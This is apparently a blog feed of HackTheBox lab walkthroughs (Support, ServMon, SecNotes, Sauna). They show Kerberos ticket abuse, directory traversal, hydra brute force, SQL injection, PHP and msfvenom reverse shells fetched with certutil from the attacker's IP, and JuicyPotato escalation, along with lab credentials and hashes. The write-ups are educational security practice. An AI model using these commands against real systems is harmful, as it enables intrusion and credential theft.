doIGjjCCBoqgAwIBBaEDAgEWooIFlzCCBZNhggWPMIIFi6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiowKKADAgECoSEwHxsEY2lmcxsXU3Ryb25nU2hpdjguc3VwcG9ydC5odGKjggVHMIIFQ6ADAgEXoQMCAQGiggU1BIIFMcLaqKBaq/7evh3za5Wi4COaikTrjaAb9/wnJ+9gqNE9Pyp2LlenXfk6IDKb0yhW+0tP4mjt1TEoSt4pId9x4WVKKCwAugyMG4kd8kd245dtunAOqYD+fQFCw6mNQmy/XW4TgXY6voIojWMxkXDtwHwml9nkZfFORdRT82ogm96wlW5v0afFgJVTSs5AaKVgdZ1cyERoCyrJApr79itocVFNKsI5a6izvOk4w2iRrKw6jCK0Ws/QqzNBi7i4pzDLehV5UFWkBixfkCgO2uzuWXLiMRg9rGI5HO5lR/j0XF2F2jT+faxy9joYG/6TmBumBZk8I4qM8Wvai82RsHyGNZIxDvc1SCJmscjfNVkv9lRym4N1A4wbe9QYNp4thxGx4dAasjvURARf1Wh7bx3dOEpu0f9mvdruVLDpyUg2KBMcX8RkcZiorWlnqMXetXKYtER83GcpiLiCw8fOV1Uzps3LabmMdNEjib4TtQM9Mu5c6Qhq3hV0D/T+8gl5tBTVUqW8MGJRBWacoYBlBAZwAOjQ/W5lrUf17t3Dz+zsol3aoToiAq+YXYPwl/1oBfIvB3WYG1xvfsWv70RkAJRykOgzurKHWB7IhHpsgf/obzyYZKK8ezHj2cp1wrZhyiAMlkG/2MB1JpXY+7+QsGVXDl17TOCEn8DzHcK99GGsKZD8tMmzD4SRxjp0CT4kPV2yAtzY5RmxkkYxVO6xQGMpZ0ge0EBCaJuXxCsgrolz4vSTlyTxEFzegZFeQup5N857g3IddU1JdzAmeHiX3P5Q/JUaS9Rq04+XUtd9xxchAb+ulNJYnTHlfhUNBfg4sZqYXHAvvQOwOP6ZwpQ9i8mfahSRg6CKFEE431WFaTIbXsS8+cKcyXqEMjo/3oTj18vp5dEU0oCrCrSQt85865/NUg5+/m1U+vbTWMUN9tjlPLgDrNTl0PC4guqXxIwmgEts8CfaF+hl/IIffXhLpsbnyoqW9POgWPBWKg6Am8F9DImH+4qyBfxQHiVK43r3Y+ugHWjJ7oS/2TxrwRYayGGEBtexXaF6Rlc+APIEEr3kAu5aR/WF4E1j0OdUcMeSOsJH1mf8fQOBJWI2IQkyrMwKGhntSK0KAvLLe7xvQ+jP9523DNxwWSg5XfUGURarWxEqXPsTaj29nA+QBIkb4e7p2GujI1bcieIMnj/H4S5RVVIS28pOxqZbgM7GC+PAyaKxz9Zoz1AHNu/IgHcK/wOXl4IMB8O3wJ+oMeYteLg8PZRK01h2h2u0aErT/VP1Kcv7yBgCSiEEspbl9cmEi+Ncf1M03FMrsTCU6dVyqTd0wjxPSqLQ7ydtdBpU3qBJAV2bHLvygUKA3Rm7hUq5Qu9kGZpHXnTjjyCxGfBWtqD8HPsSZ2U/q01fXOCipmLElR+thhlUEQXlLafm7Oo5y5hbDYzaZFOznsUAPmXCwnlF4cwI9kAc7j3YihYw0aoVbK8sn4agqdiMuCV9NzFQkUMxVef0eezjePkOVBV0Nr0775HaEXW5vMZPDrJ8gAyEVLDXXF+a5EZ88ZAPmMgGsAJpBrEVwlCoGttdIkG0nwvmnXVRcPJWPC9P5DW3YZChuWW9h9TRk7nfAf8XUYnPJfmJImMg1fKEhMM7hjgykA3OT0bfUSR7Bwr/li2N3nB3nmWJjuxLqRRPihp/PSfscrUOBUa8ftkZBNBry+qE22+BERcVsNt5yvQ2EAeYhad9JYWKWFQxgjPsOK+CB+WujZzNU7MBpATmL8/QkUf3HbMqGTxomqOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoBswGaADAgEXoRIEECeKeZgFSaex6KQGs0TICjOhDRsLU1VQUE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjQwMTIyMTM0MzU1WqYRGA8yMDI0MDEyMjIzNDM1NVqnERgPMjAyNDAxMjkxMzQzNTVaqA0bC1NVUFBPUlQuSFRCqSowKKADAgECoSEwHxsEY2lmcxsXU3Ryb25nU2hpdjguc3VwcG9ydC5odGI=[+] Ticket successfully imported!*Evil-WinRM* PS C:\\Users\\support\\Documents>```{: .nolineno}Now when I reran the bloodhound , reuploaded the data I got my computer machine StrongShiv8 with `AllowedToAct` Privileges so lets have a administrator shell â†’![Untitled](Support/Untitled%209.png)Lets convert this ticket to kerbrose readable format like `ticket.ccache` format.```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ nano ticket.kirbi.b64 â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ base64 -d ticket.kirbi.b64 > ticket.kirbi```{: .nolineno}Now lets use the tool `ticketconverter.py` that will change the format of this ticket.```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ ticketConverter.py ticket.kirbi ticket.ccacheImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] converting kirbi to ccache...[+] done```{: .nolineno}Lastly for accessing shell I used `psexec.py` but it didnâ€™t work it through this error â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-passImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)```{: .nolineno}I guess this must be because of the clock timing issue and for resolving that I ran this command â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ sudo ntpdate 10.10.11.174[sudo] password for kali: 2024-01-22 20:04:58.418502 (+0530) +490.086607 +/- 0.043138 10.10.11.174 s1 no-leapCLOCK: time stepped by 490.086607```{: .nolineno}Now I reran that psexec command and now I have a shell â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Requesting shares on dc.support.htb.....[*] Found writable share ADMIN$[*] Uploading file yRLemTSp.exe[*] Opening SVCManager on dc.support.htb.....[*] Creating service hDtV on dc.support.htb.....[*] Starting service hDtV.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.20348.859](c) Microsoft Corporation. All rights reserved.C:\\Windows\\system32> whoamint authority\\systemC:\\Windows\\system32> hostname dcC:\\Windows\\system32> cd C:\\Users\\AdminstratorThe system cannot find the path specified.C:\\Windows\\system32> cd C:\\Users\\AdministratorC:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 000001D8 955A:5CBBC:\\USERS\\ADMINISTRATOR+---.ansible_async| 472362125829.2344| +---3D Objects+---Contacts+---Desktop| root.txt| +---Documents| | clean.ps1| | ldap.ps1| | PowerView.ps1| | | \\---WindowsPowerShell| powershell.config.json| +---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator> type Desktop\\root.txt2c374e042e249f0966f4b0db54daa603C:\\Users\\Administrator>```{: .nolineno}## Another way to get the Ticket â†’Alternative of Rubeus is through using impacket Tools I got this ticket â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ impacket-getST support.htb/StrongShiv8$ -spn http/dc.support.htb -hashes :FC525C9683E8FE067095BA2DDC971889Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Getting TGT for user[*] Getting ST for user[*] Saving ticket in StrongShiv8$.ccache```{: .nolineno}Now I used `impacket-smbexec`to have that session like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ impacket-smbexec support.htb/administrator@dc.support.htb -k -no-pass Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[!] Launching semi-interactive shell - Careful what you executeC:\\Windows\\system32>whoamint authority\\systemC:\\Windows\\system32>hostnamedcC:\\Windows\\system32>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "ServMon", "url": "/posts/ServMon/", "categories": "HackTheBox", "tags": "Password Bruteforce, Port Forwarding, PrivEsc, Public Exploit, Windows", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.184[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.or...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.184[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 15:49 ISTWarning: 10.10.10.184 giving up on port because retransmission cap hit (6).Stats: 0:25:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 99.79% done; ETC: 16:15 (0:00:00 remaining)Nmap scan report for 10.10.10.184Host is up (0.17s latency).Not shown: 65517 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_02-28-22 06:35PM Users| ftp-syst: |_ SYST: Windows_NT22/tcp open ssh OpenSSH for_Windows_8.0 (protocol 2.0)| ssh-hostkey: | 3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)| 256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)|_ 256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)80/tcp open http|_http-title: Site does not have a title (text/html).| fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK| Content-type: text/html| Content-Length: 340| Connection: close| AuthInfo: | | | | | | | | | | X11Probe: | HTTP/1.1 408 Request Timeout| Content-type: text/html| Content-Length: 0| Connection: close|_ AuthInfo:135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?5666/tcp open tcpwrapped6063/tcp open tcpwrapped6699/tcp open napster?8443/tcp open ssl/https-alt|_ssl-date: TLS randomness does not represent time| http-title: NSClient++|_Requested resource was /index.html| ssl-cert: Subject: commonName=localhost| Not valid before: 2020-01-14T13:24:20|_Not valid after: 2021-01-13T13:24:2045604/tcp filtered unknown49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC```{: .nolineno}## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ ftp 10.10.10.184 21Connected to 10.10.10.184.220 Microsoft FTP ServiceName (10.10.10.184:kali): Anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp> dir229 Entering Extended Passive Mode (|||49677|)125 Data connection already open; Transfer starting.02-28-22 06:35PM Users226 Transfer complete.ftp>ftp> cd Users250 CWD command successful.ftp> dir229 Entering Extended Passive Mode (|||49679|)150 Opening ASCII mode data connection.02-28-22 06:36PM Nadine02-28-22 06:37PM Nathan226 Transfer complete.ftp> cd Nadine250 CWD command successful.ftp> dir229 Entering Extended Passive Mode (|||49680|)150 Opening ASCII mode data connection.02-28-22 06:36PM 168 Confidential.txt226 Transfer complete.ftp> get confidential.txtlocal: confidential.txt remote: confidential.txt229 Entering Extended Passive Mode (|||49681|)125 Data connection already open; Transfer starting.100% |*****************************************************************************************************| 168 0.81 KiB/s 00:00 ETA226 Transfer complete.WARNING! 6 bare linefeeds received in ASCII mode.File may not have transferred correctly.168 bytes received in 00:00 (0.57 KiB/s)ftp> cd ..250 CWD command successful.ftp> dir229 Entering Extended Passive Mode (|||49682|)c125 Data connection already open; Transfer starting.02-28-22 06:36PM Nadine02-28-22 06:37PM Nathan226 Transfer complete.ftp> cd Nathan250 CWD command successful.ftp> dir229 Entering Extended Passive Mode (|||49683|)125 Data connection already open; Transfer starting.02-28-22 06:36PM 182 Notes to do.txt226 Transfer complete.ftp> get Notes\\ to\\ do.txtlocal: Notes to do.txt remote: Notes to do.txt229 Entering Extended Passive Mode (|||49685|)125 Data connection already open; Transfer starting.100% |*****************************************************************************************************| 182 0.70 KiB/s 00:00 ETA226 Transfer complete.WARNING! 4 bare linefeeds received in ASCII mode.File may not have transferred correctly.182 bytes received in 00:00 (0.70 KiB/s)ftp>```{: .nolineno}These were the content of these files :```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ cat confidential.txt Nathan,I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.RegardsNadine â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ cat Notes\\ to\\ do.txt 1) Change the password for NVMS - Complete2) Lock down the NSClient Access - Complete3) Upload the passwords4) Remove public access to NVMS5) Place the secret files in SharePoint```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this `NVMS-1000` CMS site :![Untitled](ServMon/Untitled.png)I checked online about its vulnerability and I got one exploit related to directory or files bruteforcing so lets use this exploit â†’[TVT NVMS 1000 - directory or files bruteforcing](https://www.exploit-db.com/exploits/48311)I used this exploit but it throws some error so I used another same exploit from this github â†’[](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py)I got this site vulnerable and some content out â†’![Untitled](ServMon/Untitled%201.png)I got the hint from `confidentials.txt` file as Passwords.txt file save in Desktop directory of Nathan user so lets check that directory.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ python3 exploit3.py 10.10.10.184 Users/Nathan/Desktop/Passwords.txt win.txt[+] DT Attack Succeeded[+] Saving File Content[+] Saved[+] File Content++++++++++ BEGIN ++++++++++1nsp3ctTh3Way2Mars!Th3r34r3To0M4nyTrait0r5!B3WithM30r4ga1n5tMeL1k3B1gBut7s@W0rk0nly7h3y0unGWi11F0l10wIfH3s4b0Utg0t0H1sH0meGr4etN3w5w17hMySk1Pa5$++++++++++ END ++++++++++```{: .nolineno} I got a list of passwords so lets save them in a file called password.txt and take usernames in another file as user.txt and then run bruteforce on ssh login service.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ hydra -L user.txt -P passwords.txt ssh://10.10.10.184 -t 4Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 20:31:03[DATA] max 4 tasks per 1 server, overall 4 tasks, 28 login tries (l:4/p:7), ~7 tries per task[DATA] attacking ssh://10.10.10.184:22/[22][ssh] host: 10.10.10.184 login: nadine password: L1k3B1gBut7s@W0rk[22][ssh] host: 10.10.10.184 login: Nadine password: L1k3B1gBut7s@W0rk1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 20:31:15 â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ cat user.txt nathannadineNathanNadine```{: .nolineno}## SSH Login â¤µï¸I got the `nadine` user shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ ssh nadine@10.10.10.184 The authenticity of host '10.10.10.184 (10.10.10.184)' cant be established.ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.10.184' (ED25519) to the list of known hosts.nadine@10.10.10.184 is password: Microsoft Windows [Version 10.0.17763.864](c) 2018 Microsoft Corporation. All rights reserved.nadine@SERVMON C:\\Users\\Nadine>whoamiservmon\\nadine nadine@SERVMON C:\\Users\\Nadine>hostnameServMonnadine@SERVMON C:\\Users\\Nadine>whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enablednadine@SERVMON C:\\Users\\Nadine>nadine@SERVMON C:\\Users\\Nadine>tree /f /aFolder PATH listingVolume serial number is 20C1-47A1C:.+---3D Objects+---Contacts+---Desktop| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videosnadine@SERVMON C:\\Users\\Nadine>type Desktop\\user.txt3b0ecf36b44ad9131a1e3f0ff40dd3c2nadine@SERVMON C:\\Users\\Nadine>```{: .nolineno}I donâ€™t have very good privileges so I enumerated few other services like port 8443 which is running `NSClinet++` site.![Untitled](ServMon/Untitled%202.png)This site is not properly opening or operating. I also looked into `NSClient++` site vulnerability and I got this exploit :[NSClient++ 0.5.2.35 - Privilege Escalation](https://www.exploit-db.com/exploits/46802)But I canâ€™t use it on this broken site, so lets do `port forwarding` on port 8443 through SSH service â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/ServMon]â””â”€$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184nadine@10.10.10.184 is password: Microsoft Windows [Version 10.0.17763.864](c) 2018 Microsoft Corporation. All rights reserved.nadine@SERVMON C:\\Users\\Nadine> ```{: .nolineno}I got this port 8443 on 127.0.0.1 (localhost) site so lets access the `NSClient++` site , and lets use that exploit to move further and find the password â†’I opened this file `c:\\program files\\nsclient++\\nsclient.ini` and got the password â†’```bashPS C:\\Program Files\\NSClient++> cat nsclient.ini# If you want to fill this file with all available options run the following command: # nscp settings --generate --add-defaults --load-all# If you want to activate a module and bring in all its options use:# nscp settings --activate-module --add-defaults# For details run: nscp settings --help; in flight - TODO[/settings/default]; Undocumented keypassword = ew2x6SsGTxjRwXOT; Undocumented key allowed hosts = 127.0.0.1; in flight - TODO[/settings/NRPE/server]; Undocumented keyssl options = no-sslv2,no-sslv3```{: .nolineno}I also noticed host 127.0.0.1 is allowed so lets use the password for login and After login I got this dashboard â†’![Untitled](ServMon/Untitled%203.png)![Untitled](ServMon/Untitled%204.png)![Untitled](ServMon/Untitled%205.png)![Untitled](ServMon/Untitled%206.png)![Untitled](ServMon/Untitled%207.png)> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "SecNotes", "url": "/posts/SecNotes/", "categories": "HackTheBox", "tags": "JuicyPotato, PrivEsc, SMB, SQLi, Windows", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/SecNotes]â””â”€$ sudo nmap -sC -sV -p- -T5 -oN Nmap_Result.txt 10.10.10.97[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.or...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/SecNotes]â””â”€$ sudo nmap -sC -sV -p- -T5 -oN Nmap_Result.txt 10.10.10.97[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 12:07 ISTNmap scan report for 10.10.10.97Host is up (0.11s latency).Not shown: 65532 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Secure Notes - Login|_Requested resource was login.php445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)8808/tcp open http Microsoft IIS httpd 10.0|_http-title: IIS Windows|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACEService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2024-01-05T06:40:46|_ start_date: N/A|_clock-skew: mean: 4s, deviation: 0s, median: 3s```{: .nolineno}## Web Enumeration â¤µï¸I checked the port 80 and got a login site so I firstly signup and I found out that this site works works as note taking site â†’![Untitled](SecNotes/Untitled%201.png)After login I got this interface and tried different input and one of them is `xss` and it is vulnerable to it â†’![Untitled](SecNotes/Untitled%202.png)and I also tried `sql injection` payload as signup and logged in through it â†’![Untitled](SecNotes/Untitled%203.png)I got all the `sql` dump on site through this payload â†’![Untitled](SecNotes/Untitled%204.png)I got the credentials so lets login into the `smb` and see some shares â†’```bashtyler : 92g!mA8BGjOirkL%OG*&```{: .nolineno}I got these shares â†’![Untitled](SecNotes/Untitled%205.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/SecNotes]â””â”€$ smbclient //10.10.10.97/new-site -U 'tyler' Password for [WORKGROUP\\tyler]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Fri Jan 5 12:51:25 2024 .. D 0 Fri Jan 5 12:51:25 2024 iisstart.htm A 696 Thu Jun 21 20:56:03 2018 iisstart.png A 98757 Thu Jun 21 20:56:03 2018\t\t7736063 blocks of size 4096. 3361181 blocks availablesmb: \\> put php_shell_windows.php putting file php_shell_windows.php as \\php_shell_windows.php (25.9 kb/s) (average 20.6 kb/s)smb: \\>```{: .nolineno}I uploaded the `php` reverse shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/SecNotes]â””â”€$ rlwrap nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.16.31] from (UNKNOWN) [10.10.10.97] 53308SOCKET: Shell has connected! PID: 5376Microsoft Windows [Version 10.0.17134.228](c) 2018 Microsoft Corporation. All rights reserved.C:\\inetpub\\new-site>whoamiiis apppool\\newsiteC:\\inetpub\\new-site>hostnameSECNOTESC:\\inetpub\\new-site>```{: .nolineno}This connection get terminated after few seconds as that php reverse shell file get deleted so for getting a proper shell I created a payload in `exe` format and uploaded in `C:\\Temp` and executed it and got the shell through that â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/SecNotes]â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.31 lport=2222 -f exe > shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of exe file: 7168 bytes```{: .nolineno}I transfered this payload through `certutil` and you can also use `smb` to upload this payload in `C:\\Temp` location â†’```bashC:\\inetpub\\new-site>mkdir C:\\TEmp; cd C:\\TempC:\\TEmp>certutil -f -urlcache http://10.10.16.31/shell.exe shell.exe**** Online ****CertUtil: -URLCache command completed successfully.C:\\TEmp>C:\\inetpub\\new-site>cd C:\\TempC:\\TEmp>dir Volume in drive C has no label. Volume Serial Number is 1E7B-9B76 Directory of C:\\TEmp01/04/2024 11:39 PM .01/04/2024 11:39 PM ..01/04/2024 11:39 PM 7,168 shell.exe 1 File(s) 7,168 bytes 2 Dir(s) 13,765,730,304 bytes freeC:\\TEmp>shell.exe```{: .nolineno}I got the proper shell here and lets see the privileges â†’```bashC:\\TEmp>whoami /privwhoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeShutdownPrivilege Shut down the system DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone DisabledC:\\TEmp>```{: .nolineno}I used `JuicyPotato` and got the shell through it , I uploaded the shell.bat file through `certutil` and created it through `msfvenom` port for 445 and LHOST as tun0 interface â†’```bashC:\\TEmp>JuicyPotato.exe -t * -p shell.bat -l 4444JuicyPotato.exe -t * -p shell.bat -l 4444Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444......[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKC:\\TEmp>```{: .nolineno}and I got the response as `nt authority\\system` .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/SecNotes]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [10.10.16.31] from (UNKNOWN) [10.10.10.97] 53949Microsoft Windows [Version 10.0.17134.228](c) 2018 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>whoamiwhoamint authority\\systemC:\\WINDOWS\\system32>hostnamehostnameSECNOTESC:\\WINDOWS\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>C:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 1E7B-9B76C:.+---3D Objects+---Contacts+---Desktop| Microsoft Edge.lnk| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---OneDrive+---Pictures| +---Camera Roll| \\---Saved Pictures+---Saved Games+---Searches| winrt--{S-1-5-21-1791094074-1363918840-4199337083-500}-.searchconnector-ms| \\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txt99c1a34ca94afc1aada35347831a62b0C:\\Users\\Administrator>```{: .nolineno}I am Administrator now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Sauna", "url": "/posts/Sauna/", "categories": "HackTheBox", "tags": "Active Directory, BloodHound, DCSync, PrivEsc, kerbrute, ldapsearch", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.175 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap....", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.175 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 12:04 ISTNmap scan report for 10.10.10.175Host is up (0.092s latency).Not shown: 65515 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Egotistical Bank :: Home| http-methods: |_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-20 13:39:42Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc Microsoft Windows RPC49675/tcp open msrpc Microsoft Windows RPC49722/tcp open msrpc Microsoft Windows RPC49745/tcp open msrpc Microsoft Windows RPCService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-01-20T13:40:34|_ start_date: N/A|_clock-skew: 7h00m01s```{: .nolineno}## LDAP Enumeration â¤µï¸When comes to active directory I check LDAP default informations first through ldapsearch Tool like this :```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=local'# extended LDIF## LDAPv3# base with scope subtree# filter: (objectclass=*)# requesting: ALL## EGOTISTICAL-BANK.LOCALdn: DC=EGOTISTICAL-BANK,DC=LOCALobjectClass: topobjectClass: domainobjectClass: domainDNSdistinguishedName: DC=EGOTISTICAL-BANK,DC=LOCALinstanceType: 5whenCreated: 20200123054425.0ZwhenChanged: 20240120132536.0ZsubRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCALsubRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCALsubRefs: 